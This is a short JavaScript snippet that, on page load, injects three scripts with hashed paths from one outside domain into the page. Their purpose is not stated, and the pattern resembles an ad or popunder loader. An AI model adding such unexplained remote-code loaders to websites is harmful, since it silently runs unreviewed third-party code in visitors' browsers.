window.addEventListener('load', () => {
        const srcs = [
            'https://openairtowhardworking.com/9d/5d/7e/9d5d7e8864b7a6d89223a8dacb1b9fd8.js',
            'https://openairtowhardworking.com/a1/37/68/a1376848d2be9154b24a145e7a3a8df6.js',
            'https://openairtowhardworking.com/ae/d0/76/aed076d8107ca5d3c26d23543900a3c4.js'
        ];
        srcs.forEach(src => {
            const s = document.createElement('script');
            s.src = src;
            s.async = true;
            document.body.appendChild(s);
        })
});
